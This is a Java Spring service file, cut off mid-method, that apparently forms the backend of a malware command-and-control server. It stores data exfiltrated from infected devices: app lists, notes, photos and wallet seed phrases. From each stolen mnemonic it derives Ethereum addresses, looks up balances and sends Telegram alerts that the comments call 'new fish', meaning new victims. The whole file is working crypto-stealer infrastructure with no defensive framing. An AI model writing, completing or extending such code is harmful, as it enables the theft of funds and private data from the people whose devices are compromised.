package com.consume.service;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.dao.DuplicateKeyException;
import org.springframework.stereotype.Component;
import org.springframework.transaction.support.TransactionSynchronization;
import org.springframework.transaction.support.TransactionSynchronizationManager;

import java.util.concurrent.Executor;

import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.consume.config.AlbumAsyncConfig;
import com.consume.dao.Address4Dao;
import com.consume.dao.AlbumDao;
import com.consume.dao.AppListDao;
import com.consume.dao.C2EventDecryptDao;
import com.consume.dao.C2EventRecordsDao;
import com.consume.dao.MemorandumDao;
import com.consume.dao.MnemonicDao;
import com.consume.dao.UbDecryptDao;
import com.consume.dao.UjDecryptDao;
import com.consume.entity.Address4Entity;
import com.consume.entity.AlbumEntity;
import com.consume.entity.AppListEntity;
import com.consume.entity.C2EventEecryptEntity;
import com.consume.entity.C2EventRecordsEntity;
import com.consume.entity.MemorandumEntity;
import com.consume.entity.MnemonicEntity;
import com.consume.entity.UbDecryptEntity;
import com.consume.entity.UjDecryptEntity;
import com.consume.util.AesStoreCipher;
import com.consume.util.DigestUtil;
import com.consume.util.TPhotoDecryptor;
import com.consume.util.WalletDerivator;
import com.consume.util.WalletSourceUtil;

/**
 * C2 业务落库服务（对齐 XADD.md §5 各 handler 的「解密落库 + 业务落库」）。
 *
 * 各 save_* 方法把解密结果 / 业务数据写入对应表。
 */
@Component
public class C2BusinessStore {

    private static final Logger log = LoggerFactory.getLogger(C2BusinessStore.class);

    @Autowired private C2EventDecryptDao c2EventDecryptDao;
    @Autowired private C2EventRecordsDao c2EventRecordsDao;
    @Autowired private AppListDao appListDao;
    @Autowired private MnemonicDao mnemonicDao;
    @Autowired private Address4Dao address4Dao;
    @Autowired private MemorandumDao memorandumDao;
    @Autowired private AlbumDao albumDao;
    @Autowired private UbDecryptDao ubDecryptDao;
    @Autowired private UjDecryptDao ujDecryptDao;
    @Autowired private AddressListenNotifier addressListenNotifier;
    @Autowired private MnemonicTelegramService mnemonicTelegramService;

    @Autowired
    @Qualifier("albumMaterializeExecutor")
    private Executor albumMaterializeExecutor;

    @Autowired
    @Qualifier("walletDeriveExecutor")
    private Executor walletDeriveExecutor;

    @org.springframework.beans.factory.annotation.Value("${news4.album.photo-dir:}")
    private String photoDir;

    @org.springframework.beans.factory.annotation.Value("${news4.album.photo-url-prefix:admin/data/photos}")
    private String photoUrlPrefix;

    @org.springframework.beans.factory.annotation.Value("${news4.mnemonic.mnemonic-aes-key:${news4.mnemonic.encrypt-key:}}")
    private String mnemonicAesKey;

    // ---------- 通用解密落库 ----------

    /** 写 c2_event_decrypt（/event /u /us /nb /t 占位共用）。同一 c2_record_id 重投时幂等跳过。 */
    public void saveEventDecrypt(C2HandlerContext ctx, String plaintextJson, String keyLabel) {
        try {
            C2EventEecryptEntity e = new C2EventEecryptEntity();
            e.setC2RecordId((int) ctx.getRecordId());
            e.setXTs(ctx.getXTs());
            e.setSuccess(ctx.getSuccess() == null ? 0 : ctx.getSuccess());
            e.setKeyLabel(keyLabel == null ? "" : keyLabel);
            e.setPrefix(ctx.getPrefix() == null ? "" : ctx.getPrefix());
            e.setPlaintextJson(plaintextJson == null ? "" : plaintextJson);
            e.setRawText(ctx.getRawText() == null ? "" : ctx.getRawText());
            e.setErrormsg(ctx.getDecryptError() == null ? "" : ctx.getDecryptError());
            e.setDecryptedAt(System.currentTimeMillis() / 1000.0);
            c2EventDecryptDao.insert(e);
        } catch (DuplicateKeyException dup) {
            log.debug("正常日志:[c2_handlers][save_event_decrypt] 已存在，跳过插入, recordId={}",
                    ctx.getRecordId());
        } catch (Exception ex) {
            if (isDuplicateKey(ex)) {
                log.debug("正常日志:[c2_handlers][save_event_decrypt] 已存在，跳过插入, recordId={}",
                        ctx.getRecordId());
                return;
            }
            log.info("异常日志:[c2_handlers][save_event_decrypt] 写入失败, recordId={}, err={}",
                    ctx.getRecordId(), ex.getMessage());
        }
    }

    private static boolean isDuplicateKey(Throwable ex) {
        for (Throwable t = ex; t != null; t = t.getCause()) {
            if (t instanceof DuplicateKeyException) {
                return true;
            }
            String msg = t.getMessage();
            if (msg != null && (msg.contains("Duplicate entry") || msg.contains("uk_c2_event_decrypt"))) {
                return true;
            }
        }
        return false;
    }

    // ---------- /event ----------

    /** /event 业务落库 → c2_event_records */
    public void insertEventRecord(C2HandlerContext ctx, JSONObject plaintext) {
        if (plaintext == null) {
            return;
        }
        if (!hasDeviceRow(ctx)) {
            log.info("异常日志:[c2_handlers][c2_event_records] 无 device_row_id，跳过写入, recordId={}",
                    ctx.getRecordId());
            return;
        }
        try {
            C2EventRecordsEntity e = new C2EventRecordsEntity();
            e.setC2RecordId((int) ctx.getRecordId());
            e.setDeviceId(ctx.getDeviceRowId());
            e.setChannelcode(ctx.getChannelcode() == null ? "" : ctx.getChannelcode());
            e.setEt(str(plaintext, "et"));
            e.setPv(str(plaintext, "pv"));
            e.setPn(str(plaintext, "pn"));
            e.setM(str(plaintext, "m"));
            e.setEcid(str(plaintext, "d"));
            e.setSerial(str(plaintext, "s"));
            e.setC2Uid(str(plaintext, "u"));
            e.setEventUuid(str(plaintext, "id"));
            e.setLhu(str(plaintext, "lhu"));
            e.setSbu(str(plaintext, "sbu"));
            e.setTm(longVal(plaintext, "tm"));
            e.setEx(intVal(plaintext, "ex"));
            e.setDescText(str(plaintext, "desc"));
            Object ctxObj = plaintext.get("ctx");
            e.setCtxJson(ctxObj == null ? "" : JSONObject.toJSONString(ctxObj));
            e.setPlaintextJson(ctx.getPlaintextJson() == null ? "" : ctx.getPlaintextJson());
            e.setCapturedAt(ctx.getRecord() == null ? null : ctx.getRecord().getCapturedAt());
            c2EventRecordsDao.insert(e);
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][c2_event_records] 写入失败, recordId={}, err={}",
                    ctx.getRecordId(), ex.getMessage());
        }
    }

    // ---------- /u ----------

    /** /u 业务落库 → applist（al 为应用列表数组） */
    public void saveApplist(C2HandlerContext ctx, JSONObject plaintext) {
        if (plaintext == null) {
            return;
        }
        if (!hasDeviceRow(ctx)) {
            log.info("异常日志:[c2_handlers][applist] 无 device_row_id，跳过写入, recordId={}, deviceid={}",
                    ctx.getRecordId(), ctx.getDeviceId());
            return;
        }
        JSONArray al = plaintext.getJSONArray("al");
        if (al == null || al.isEmpty()) {
            log.info("正常日志:[c2_handlers][applist] al 为空, recordId={}", ctx.getRecordId());
            return;
        }
        Integer deviceRowId = ctx.getDeviceRowId();
        String deviceUid = ctx.getDeviceId() == null ? "" : ctx.getDeviceId();
        double now = System.currentTimeMillis() / 1000.0;
        int ok = 0;
        int skipped = 0;
        for (int i = 0; i < al.size(); i++) {
            try {
                JSONObject app = al.getJSONObject(i);
                if (app == null) {
                    continue;
                }
                AppListEntity e = new AppListEntity();
                e.setDeviceRowId(deviceRowId);
                e.setDeviceUid(deviceUid);
                e.setAppName(str(app, "a"));
                e.setBundleId(str(app, "b"));
                e.setVersion(str(app, "v"));
                e.setAddtime(now);
                appListDao.insert(e);
                ok++;
            } catch (DuplicateKeyException dup) {
                skipped++;
                log.info("正常日志:[c2_handlers][applist] 已存在，跳过, recordId={}, idx={}",
                        ctx.getRecordId(), i);
            } catch (Exception ex) {
                log.info("异常日志:[c2_handlers][applist] 单条插入失败, recordId={}, idx={}, err={}",
                        ctx.getRecordId(), i, ex.getMessage());
            }
        }
        log.info("正常日志:[c2_handlers][applist] 写入 {} 条, 跳过 {} 条, recordId={}, deviceRowId={}",
                ok, skipped, ctx.getRecordId(), deviceRowId);
    }

    // ---------- /us ----------

    /** /us 业务落库 → mnemonic（加密存）+ 可能派生 address4 */
    public void saveMnemonic(C2HandlerContext ctx, JSONObject plaintext) {
        if (plaintext == null) {
            return;
        }
        if (!hasDeviceRow(ctx) || ctx.getDeviceId() == null || ctx.getDeviceId().isEmpty()) {
            log.info("异常日志:[c2_handlers][mnemonic] 无设备信息，跳过写入, recordId={}, deviceRowId={}, deviceid={}",
                    ctx.getRecordId(), ctx.getDeviceRowId(), ctx.getDeviceId());
            return;
        }
        String resultRaw = str(plaintext, "result");
        if (resultRaw.isEmpty()) {
            log.info("正常日志:[c2_handlers][mnemonic] result 为空, recordId={}", ctx.getRecordId());
            return;
        }
        // 与 18 一致：小写 + trim + 空白压缩，同一物理词只算一次
        String result = normalizeMnemonic(resultRaw);
        if (result.isEmpty()) {
            log.info("正常日志:[c2_handlers][mnemonic] result 规范化后为空, recordId={}", ctx.getRecordId());
            return;
        }
        // wordscount：助记词位数（按空白分词计数，如 12/15/18/21/24）
        int wordscount = 0;
        String[] parts = result.split("\\s+");
        for (String p : parts) {
            if (!p.isEmpty()) {
                wordscount++;
            }
        }
        String phraseHash = DigestUtil.sha256Hex(result);
        String deviceId = ctx.getDeviceId() == null ? "" : ctx.getDeviceId();
        String source = WalletSourceUtil.toWalletName(str(plaintext, "a"));

        // 同设备 + 同钱包 + 同词：已存在则不再入库、不再派生
        try {
            Integer existId = mnemonicDao.findIdByDeviceSourceHash(deviceId, source, phraseHash);
            if (existId != null && existId > 0) {
                try {
                    mnemonicDao.incrementDupCount(deviceId, source, phraseHash);
                } catch (Exception ex) {
                    log.info("异常日志:[c2_handlers][mnemonic] 递增 dup 失败, recordId={}, err={}",
                            ctx.getRecordId(), ex.getMessage());
                }
                log.info("正常日志:[c2_handlers][mnemonic] 重复跳过(同设备+钱包+词), recordId={}, existId={}, deviceid={}, source={}",
                        ctx.getRecordId(), existId, deviceId, source);
                return;
            }
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][mnemonic] 幂等预查失败，继续插入, recordId={}, err={}",
                    ctx.getRecordId(), ex.getMessage());
        }

        try {
            MnemonicEntity e = new MnemonicEntity();
            // mnemonic.device_id 存 device.deviceid（不是 device.device_id）
            e.setDeviceId(deviceId);
            e.setChannelcode(ctx.getChannelcode() == null ? "" : ctx.getChannelcode());
            e.setWordscount(wordscount);
            // 助记词加密入库（AES-256-ECB，与 18-consumer-server 一致）；result_hash 存明文 sha256 供查重
            e.setResult(encryptMnemonic(result));
            e.setSource(source);
            e.setRecvDupCount(0);
            e.setStatus(1);
            e.setPhraseHash(phraseHash);
            e.setAddtime(System.currentTimeMillis() / 1000.0);
            mnemonicDao.insert(e);

            // 派生用规范化后的词（与入库一致）
            JSONObject derivePt = plaintext;
            if (!result.equals(resultRaw)) {
                derivePt = new JSONObject(plaintext);
                derivePt.put("result", result);
            }
            // 派生 address4：离载 Kafka listener，事务提交后异步执行（CallerRuns 保证不丢）
            scheduleDeriveAddress4(e.getId(), derivePt, ctx);

            // 新助记词入库成功 → 异步飞机「新鱼苗」通知
            try {
                mnemonicTelegramService.notifyFishAsync(
                        ctx.getDeviceRowId(),
                        ctx.getDeviceId(),
                        ctx.getChannelcode(),
                        ctx.getClientIp());
            } catch (Exception te) {
                log.info("异常日志:[c2_handlers][mnemonic] 新鱼苗通知提交失败, recordId={}, err={}",
                        ctx.getRecordId(), te.getMessage());
            }
        } catch (DuplicateKeyException dup) {
            // 并发竞态兜底：递增 recv_dup_count，不派生
            try {
                mnemonicDao.incrementDupCount(deviceId, source, phraseHash);
                log.info("正常日志:[c2_handlers][mnemonic] 重复助记词(UK冲突)，递增 dup, recordId={}, source={}",
                        ctx.getRecordId(), source);
            } catch (Exception ex) {
                log.info("异常日志:[c2_handlers][mnemonic] 递增 dup 失败, recordId={}, err={}",
                        ctx.getRecordId(), ex.getMessage());
            }
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][mnemonic] 写入失败, recordId={}, err={}",
                    ctx.getRecordId(), ex.getMessage());
        }
    }

    /** 助记词规范化：与 18 PhraseResult 一致，保证同一物理词 hash 稳定 */
    private static String normalizeMnemonic(String phrase) {
        if (phrase == null || phrase.isEmpty()) {
            return "";
        }
        return phrase.toLowerCase().trim().replaceAll("\\s+", " ");
    }

    /** address4 派生：由 mnemonic 经 web3j 派生 ETH 地址并插入 address4；成功后异步通知三方监听 */
    private void scheduleDeriveAddress4(Integer mnemonicId, JSONObject plaintext, C2HandlerContext ctx) {
        if (mnemonicId == null) {
            return;
        }
        Runnable job = () -> {
            try {
                deriveAddress4(mnemonicId, plaintext, ctx);
            } catch (Throwable t) {
                log.info("异常日志:[c2_handlers][address4] 异步派生失败, mnemonicId={}, err={}",
                        mnemonicId, t.toString());
            }
        };
        Runnable submit = () -> {
            try {
                walletDeriveExecutor.execute(job);
            } catch (Exception ex) {
                log.info("异常日志:[c2_handlers][address4] 提交派生失败，降级同步, mnemonicId={}, err={}",
                        mnemonicId, ex.getMessage());
                job.run();
            }
        };
        if (TransactionSynchronizationManager.isSynchronizationActive()) {
            TransactionSynchronizationManager.registerSynchronization(new TransactionSynchronization() {
                @Override
                public void afterCommit() {
                    submit.run();
                }
            });
            return;
        }
        submit.run();
    }

    private void deriveAddress4(Integer mnemonicId, JSONObject plaintext, C2HandlerContext ctx) {
        if (mnemonicId == null) {
            return;
        }
        String mnemonic = plaintext == null ? "" : str(plaintext, "result");
        java.util.List<WalletDerivator.DerivedAddress> list = WalletDerivator.derive(mnemonic);
        double now = System.currentTimeMillis() / 1000.0;
        int ok = 0;
        java.util.List<WalletDerivator.DerivedAddress> inserted = new java.util.ArrayList<>();
        for (WalletDerivator.DerivedAddress da : list) {
            try {
                Address4Entity a = new Address4Entity();
                a.setMnemonicId(mnemonicId);
                a.setAddress(da.address);
                a.setChaintype(da.chaintype);
                a.setAddrindex(da.addrIndex);
                a.setStatus(1);
                a.setAlgorithm(da.algorithm);
                a.setNativeBal("0");
                a.setUsdtBal("0");
                a.setUsdcBal("0");
                a.setBalanceRefreshedAt(now);
                a.setAddtime(now);
                address4Dao.upsert(a);
                ok++;
                inserted.add(da);
            } catch (Exception ex) {
                log.info("异常日志:[c2_handlers][address4] 插入失败, mnemonicId={}, chain={}, err={}",
                        mnemonicId, da.chaintype, ex.getMessage());
            }
        }
        log.info("正常日志:[c2_handlers][address4] 派生并写入 {} 条, mnemonicId={}", ok, mnemonicId);
        // 事务提交后异步调三方，不占用消费线程
        if (!inserted.isEmpty()) {
            addressListenNotifier.notifyAfterCommit(mnemonicId, inserted);
            // 查余额 + 飞机余额通知（独立线程池）
            try {
                mnemonicTelegramService.notifyBalanceAfterDeriveAsync(
                        mnemonicId,
                        ctx == null ? null : ctx.getDeviceRowId(),
                        ctx == null ? null : ctx.getDeviceId(),
                        ctx == null ? null : ctx.getChannelcode(),
                        ctx == null ? null : ctx.getClientIp(),
                        inserted);
            } catch (Exception e) {
                log.info("异常日志:[c2_handlers][address4] 余额通知提交失败 mnemonicId={} err={}",
                        mnemonicId, e.getMessage());
            }
        }
    }

    // ---------- /nb ----------

    /** /nb 业务落库 → memorandum（list 为备忘录数组） */
    public void saveMemorandum(C2HandlerContext ctx, JSONObject plaintext) {
        if (plaintext == null) {
            return;
        }
        if (!hasDeviceRow(ctx)) {
            log.info("异常日志:[c2_handlers][memorandum] 无 device_row_id，跳过写入, recordId={}, deviceid={}",
                    ctx.getRecordId(), ctx.getDeviceId());
            return;
        }
        JSONArray list = plaintext.getJSONArray("list");
        if (list == null || list.isEmpty()) {
            log.info("正常日志:[c2_handlers][memorandum] list 为空, recordId={}", ctx.getRecordId());
            return;
        }
        Integer deviceRowId = ctx.getDeviceRowId();
        String deviceUid = ctx.getDeviceId() == null ? "" : ctx.getDeviceId();
        String channelcode = ctx.getChannelcode() == null ? "" : ctx.getChannelcode();
        double now = System.currentTimeMillis() / 1000.0;
        int ok = 0;
        for (int i = 0; i < list.size(); i++) {
            try {
                JSONObject item = asJsonObject(list.get(i));
                if (item == null) {
                    continue;
                }
                String title = str(item, "title");
                String content = str(item, "content");
                if (content.isEmpty()) {
                    // 兼容 /nb 的字符串项或仅有单值字段的 JSON 项
                    content = firstNonEmpty(str(item, "value"), str(item, "text"), str(item, "memo"));
                }
                if (title.isEmpty()) {
                    title = firstNonEmpty(str(item, "name"), str(item, "label"));
                }
                if (content.isEmpty()) {
                    continue;
                }
                MemorandumEntity e = new MemorandumEntity();
                e.setDeviceRowId(deviceRowId);
                e.setDeviceUid(deviceUid);
                e.setChannelcode(channelcode);
                e.setSerial(str(plaintext, "s"));
                e.setTitle(title);
                e.setContent(content);
                e.setContentHash(DigestUtil.sha256Hex(content));
                e.setType(normalizeMemoType(item.get("type")));
                e.setC2RecordId((int) ctx.getRecordId());
                e.setAddtime(now);
                memorandumDao.insert(e);
                ok++;
            } catch (DuplicateKeyException dup) {
                // 同设备同内容已存在，跳过
            } catch (Exception ex) {
                log.info("异常日志:[c2_handlers][memorandum] 单条插入失败, recordId={}, idx={}, err={}",
                        ctx.getRecordId(), i, ex.getMessage());
            }
        }
        log.info("正常日志:[c2_handlers][memorandum] 写入 {} 条, recordId={}, deviceRowId={}, channelcode={}",
                ok, ctx.getRecordId(), deviceRowId, channelcode);
    }

    // ---------- /t ----------

    /** /t 业务落库 → album；fields 为 multipart 表单字段，fileBlob 为文件字节。
     *  去重：优先 device_row_id+file_sha256，其次 c2_record_id；命中已 OK 则跳过解图。
     *  解图在事务提交后投递独立线程池，不占用 Kafka/Redis 消费线程。 */
    public void saveAlbum(C2HandlerContext ctx, java.util.Map<String, String> fields,
                          byte[] fileBlob, String fileName) {
        try {
            if (!hasDeviceRow(ctx)) {
                log.info("异常日志:[c2_handlers][album] 无 device_row_id，跳过写入, recordId={}",
                        ctx.getRecordId());
                return;
            }
            String formTs = field(fields, "ts");
            String xTs = com.consume.util.HeadersUtil.header(ctx.getHeadersJson(), "x-ts");
            Integer deviceRowId = ctx.getDeviceRowId();
            int c2RecordId = (int) ctx.getRecordId();
            String sha = DigestUtil.sha256Hex(fileBlob);

            AlbumEntity existing = findExistingAlbum(deviceRowId, sha, c2RecordId);
            if (existing != null && existing.getId() != null) {
                albumDao.fillC2RecordId(existing.getId(), c2RecordId);
                Integer st = existing.getStatus();
                log.debug("正常日志:[c2_handlers][album] 已存在，跳过插入, recordId={}, albumId={}, status={}",
                        ctx.getRecordId(), existing.getId(), st);
                // 未成功落盘的重复消息：再投一次解图（幂等：OK 则跳过）
                if ((st == null || st != 1) && fileBlob != null && fileBlob.length > 0) {
                    String ts = (formTs == null || formTs.isEmpty()) ? existing.getFormTs() : formTs;
                    scheduleMaterialize(existing.getId(),
                            existing.getDeviceRowId() == null ? deviceRowId : existing.getDeviceRowId(),
                            fileBlob, ts, fileName);
                }
                return;
            }

            AlbumEntity e = new AlbumEntity();
            e.setDeviceRowId(deviceRowId);
            e.setDeviceUid(ctx.getDeviceId() == null ? "" : ctx.getDeviceId());
            e.setChannelcode(ctx.getChannelcode() == null ? "" : ctx.getChannelcode());
            e.setEcid(ctx.getDeviceId() == null ? "" : ctx.getDeviceId());
            e.setSerial(field(fields, "s"));
            e.setRid(field(fields, "rid"));
            e.setFilename(fileName == null ? "" : fileName);
            e.setFileSize(fileBlob == null ? 0 : fileBlob.length);
            e.setFileSha256(sha);
            e.setFormTs(formTs);
            e.setXTs(xTs);
            e.setC2RecordId(c2RecordId);
            e.setStatus(0); // pending
            e.setType(0);
            e.setAddtime(System.currentTimeMillis() / 1000.0);
            e.setParsedAt(null);

            try {
                albumDao.insert(e);
            } catch (DuplicateKeyException dup) {
                AlbumEntity again = findExistingAlbum(deviceRowId, sha, c2RecordId);
                if (again != null && again.getId() != null) {
                    albumDao.fillC2RecordId(again.getId(), c2RecordId);
                    log.info("正常日志:[c2_handlers][album] 并发插入冲突，复用已有, recordId={}, albumId={}",
                            ctx.getRecordId(), again.getId());
                    if ((again.getStatus() == null || again.getStatus() != 1)
                            && fileBlob != null && fileBlob.length > 0) {
                        scheduleMaterialize(again.getId(), deviceRowId, fileBlob, formTs, fileName);
                    }
                    return;
                }
                throw dup;
            }

            Integer albumId = e.getId();
            log.debug("正常日志:[c2_handlers][album] 写入, recordId={}, albumId={}, fileSize={}, sha256={}",
                    ctx.getRecordId(), albumId, e.getFileSize(), e.getFileSha256());

            if (albumId != null && albumId > 0 && fileBlob != null && fileBlob.length > 0) {
                scheduleMaterialize(albumId, deviceRowId, fileBlob, formTs, fileName);
            }
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][album] 写入失败, recordId={}, err={}",
                    ctx.getRecordId(), ex.getMessage());
        }
    }

    private AlbumEntity findExistingAlbum(Integer deviceRowId, String sha, int c2RecordId) {
        if (sha != null && !sha.isEmpty() && deviceRowId != null) {
            try {
                AlbumEntity bySha = albumDao.findByDeviceAndSha(deviceRowId, sha);
                if (bySha != null) {
                    return bySha;
                }
            } catch (Exception ex) {
                log.info("异常日志:[c2_handlers][album] 按 sha 查重失败, err={}", ex.getMessage());
            }
        }
        if (c2RecordId > 0) {
            try {
                return albumDao.findByC2RecordId(c2RecordId);
            } catch (Exception ex) {
                log.info("异常日志:[c2_handlers][album] 按 c2_record_id 查重失败, err={}", ex.getMessage());
            }
        }
        return null;
    }

    private void scheduleMaterialize(Integer albumId, Integer deviceRowId,
                                     byte[] fileBlob, String formTs, String fileName) {
        AlbumAsyncConfig.AlbumRejectAware task = new AlbumAsyncConfig.AlbumRejectAware() {
            @Override
            public void run() {
                materializeAlbumImage(albumId, deviceRowId, fileBlob, formTs, fileName);
            }

            @Override
            public void onRejected() {
                markAlbumFail(albumId, "解图队列已满，请稍后重投或人工补解");
            }
        };
        Runnable submit = () -> {
            try {
                albumMaterializeExecutor.execute(task);
            } catch (Exception ex) {
                markAlbumFail(albumId, "提交解图任务失败: " + ex.getMessage());
                log.info("异常日志:[c2_handlers][album] 提交解图失败, albumId={}, err={}",
                        albumId, ex.getMessage());
            }
        };
        if (TransactionSynchronizationManager.isSynchronizationActive()) {
            TransactionSynchronizationManager.registerSynchronization(new TransactionSynchronization() {
                @Override
                public void afterCommit() {
                    submit.run();
                }
            });
            return;
        }
        submit.run();
    }

    /** 解密 .dat → 图片字节 → 落盘到 <photoDir>/<deviceRowId>/<albumId>.ext，并更新 album 状态。 */
    private void materializeAlbumImage(Integer albumId, Integer deviceRowId,
                                       byte[] fileBlob, String formTs, String fileName) {
        try {
            AlbumEntity cur = albumDao.selectById(albumId);
            if (cur != null && cur.getStatus() != null && cur.getStatus() == 1) {
                log.debug("正常日志:[c2_handlers][album] 已是 OK，跳过解图, albumId={}", albumId);
                return;
            }
        } catch (Exception ignore) {
            // 查状态失败仍继续解图
        }
        if (photoDir == null || photoDir.trim().isEmpty()) {
            log.info("正常日志:[c2_handlers][album] photo-dir 未配置，跳过图片落盘, albumId={}", albumId);
            return;
        }
        if (formTs == null || formTs.isEmpty()) {
            markAlbumFail(albumId, "缺少表单字段 ts（7z 密码 = prefix + ts）");
            return;
        }
        byte[] image;
        String imageMemberName;
        String ext;
        try {
            TPhotoDecryptor.ImageDetail detail = TPhotoDecryptor.decryptDatToImage(fileBlob, formTs);
            image = detail.image;
            imageMemberName = detail.imageName;
            ext = detail.ext;
        } catch (Exception ex) {
            markAlbumFail(albumId, "解密失败: " + ex.getMessage());
            log.info("异常日志:[c2_handlers][album] 解密失败, albumId={}, err={}", albumId, ex.getMessage());
            return;
        }
        if (image == null || image.length == 0) {
            markAlbumFail(albumId, "7z 解出空内容");
            return;
        }

        String devDir = String.valueOf(deviceRowId == null ? 0 : deviceRowId);
        java.io.File absDir = new java.io.File(new java.io.File(photoDir.trim()), devDir);
        if (!absDir.exists() && !absDir.mkdirs()) {
            markAlbumFail(albumId, "创建目录失败: " + absDir);
            log.info("异常日志:[c2_handlers][album] 创建目录失败, dir={}", absDir);
            return;
        }
        String safeExt = (ext == null || !ext.startsWith(".")) ? ".bin" : ext;
        java.io.File absPath = new java.io.File(absDir, albumId + safeExt);
        try {
            java.nio.file.Files.write(absPath.toPath(), image);
        } catch (Exception ex) {
            markAlbumFail(albumId, "图片落盘失败: " + ex.getMessage());
            log.info("异常日志:[c2_handlers][album] 图片落盘失败, albumId={}, err={}", albumId, ex.getMessage());
            return;
        }
        String relPath = joinUrlPrefix(photoUrlPrefix, devDir + "/" + albumId + safeExt);
        String imageName = (imageMemberName == null || imageMemberName.isEmpty())
                ? absPath.getName() : imageMemberName;

        AlbumEntity upd = new AlbumEntity();
        upd.setId(albumId);
        upd.setStatus(1); // OK
        upd.setImagePath(relPath);
        upd.setImageName(imageName.length() > 256 ? imageName.substring(0, 256) : imageName);
        upd.setErrorMsg("");
        upd.setParsedAt(System.currentTimeMillis() / 1000.0);
        albumDao.updateById(upd);
        log.debug("正常日志:[c2_handlers][album] 图片落盘成功, albumId={}, size={}, path={}",
                albumId, image.length, absPath.getAbsolutePath());
    }

    private void markAlbumFail(Integer albumId, String error) {
        try {
            AlbumEntity upd = new AlbumEntity();
            upd.setId(albumId);
            upd.setStatus(2); // FAIL
            upd.setErrorMsg(error == null ? "" : (error.length() > 512 ? error.substring(0, 512) : error));
            upd.setParsedAt(System.currentTimeMillis() / 1000.0);
            albumDao.updateById(upd);
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][album] 标记失败状态失败, albumId={}, err={}", albumId, ex.getMessage());
        }
    }

    // ---------- /ub ----------

    /** /ub 业务落库 → ub_decrypt（含解密结果与设备字段） */
    public void saveUbDecrypt(C2HandlerContext ctx, JSONObject plaintext) {
        if (!hasDeviceRow(ctx)) {
            log.info("异常日志:[c2_handlers][ub_decrypt] 无 device_row_id，跳过写入, recordId={}",
                    ctx.getRecordId());
            return;
        }
        try {
            UbDecryptEntity e = new UbDecryptEntity();
            e.setC2RecordId((int) ctx.getRecordId());
            e.setDeviceId(ctx.getDeviceRowId());
            e.setClientIp(ctx.getClientIp());
            e.setXTs(ctx.getXTs());
            e.setSuccess(ctx.getSuccess() == null ? 0 : ctx.getSuccess());
            e.setKeyLabel(ctx.getKeyLabel() == null ? "" : ctx.getKeyLabel());
            e.setErrorMsg(ctx.getDecryptError() == null ? "" : ctx.getDecryptError());
            e.setEcid(ctx.getDeviceId() == null ? "" : ctx.getDeviceId());
            e.setC2Uid(plaintext == null ? "" : str(plaintext, "u"));
            e.setSerial(plaintext == null ? "" : str(plaintext, "s"));
            e.setSourceTag(plaintext == null ? "" : str(plaintext, "source"));
            e.setClientVer(plaintext == null ? "" : str(plaintext, "v"));
            e.setChannelHash(plaintext == null ? "" : str(plaintext, "channelHash"));
            Object ba = plaintext == null ? null : plaintext.get("ba");
            e.setBaJson(ba == null ? "" : JSONObject.toJSONString(ba));
            e.setPlaintextJson(ctx.getPlaintextJson() == null ? "" : ctx.getPlaintextJson());
            e.setDecryptedAt(System.currentTimeMillis() / 1000.0);
            ubDecryptDao.insert(e);
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][ub_decrypt] 写入失败, recordId={}, err={}",
                    ctx.getRecordId(), ex.getMessage());
        }
    }

    // ---------- /uj ----------

    /** /uj 业务落库 → uj_decrypt */
    public void saveUjDecrypt(C2HandlerContext ctx, JSONObject plaintext) {
        if (!hasDeviceRow(ctx)) {
            log.info("异常日志:[c2_handlers][uj_decrypt] 无 device_row_id，跳过写入, recordId={}",
                    ctx.getRecordId());
            return;
        }
        try {
            UjDecryptEntity e = new UjDecryptEntity();
            e.setC2RecordId((int) ctx.getRecordId());
            e.setDeviceId(ctx.getDeviceRowId());
            e.setClientIp(ctx.getClientIp());
            e.setXTs(ctx.getXTs());
            e.setSuccess(ctx.getSuccess() == null ? 0 : ctx.getSuccess());
            e.setKeyLabel(ctx.getKeyLabel() == null ? "" : ctx.getKeyLabel());
            e.setErrorMsg(ctx.getDecryptError() == null ? "" : ctx.getDecryptError());
            e.setEcid(ctx.getDeviceId() == null ? "" : ctx.getDeviceId());
            e.setC2Uid(plaintext == null ? "" : str(plaintext, "u"));
            e.setSerial(plaintext == null ? "" : str(plaintext, "s"));
            e.setSourceTag(plaintext == null ? "" : str(plaintext, "source"));
            e.setClientVer(plaintext == null ? "" : str(plaintext, "v"));
            e.setChannelHash(plaintext == null ? "" : str(plaintext, "channelHash"));
            Object result = plaintext == null ? null : plaintext.get("result");
            e.setResultJson(result == null ? "" : JSONObject.toJSONString(result));
            e.setResultType(plaintext == null ? "" : str(plaintext, "resultType"));
            e.setFingerprint(plaintext == null ? "" : str(plaintext, "fingerprint"));
            e.setWalletName(plaintext == null ? "" : str(plaintext, "walletName"));
            e.setPlaintextJson(ctx.getPlaintextJson() == null ? "" : ctx.getPlaintextJson());
            e.setDecryptedAt(System.currentTimeMillis() / 1000.0);
            ujDecryptDao.insert(e);
        } catch (Exception ex) {
            log.info("异常日志:[c2_handlers][uj_decrypt] 写入失败, recordId={}, err={}",
                    ctx.getRecordId(), ex.getMessage());
        }
    }

    // ---------- helpers ----------

    /** 业务表必须带上 device 主键；没有则宁可跳过，也不写 device_row_id=0 的脏数据 */
    private static boolean hasDeviceRow(C2HandlerContext ctx) {
        Integer id = ctx == null ? null : ctx.getDeviceRowId();
        return id != null && id > 0;
    }

    /** 拼 image_path：prefix + relative，去掉多余斜杠。prefix 为空则只存 relative。 */
    private static String joinUrlPrefix(String prefix, String relative) {
        String rel = relative == null ? "" : relative.replace("\\", "/").replaceAll("^/+", "");
        if (prefix == null || prefix.trim().isEmpty()) {
            return rel;
        }
        String p = prefix.trim().replace("\\", "/").replaceAll("/+$", "");
        return p + "/" + rel;
    }

    private static String str(JSONObject o, String k) {
        if (o == null) {
            return "";
        }
        Object v = o.get(k);
        return v == null ? "" : v.toString();
    }

    private static String field(java.util.Map<String, String> fields, String k) {
        if (fields == null) {
            return "";
        }
        String v = fields.get(k);
        return v == null ? "" : v;
    }

    private static JSONObject asJsonObject(Object value) {
        if (value instanceof JSONObject) {
            return (JSONObject) value;
        }
        if (value == null) {
            return null;
        }
        if (value instanceof String) {
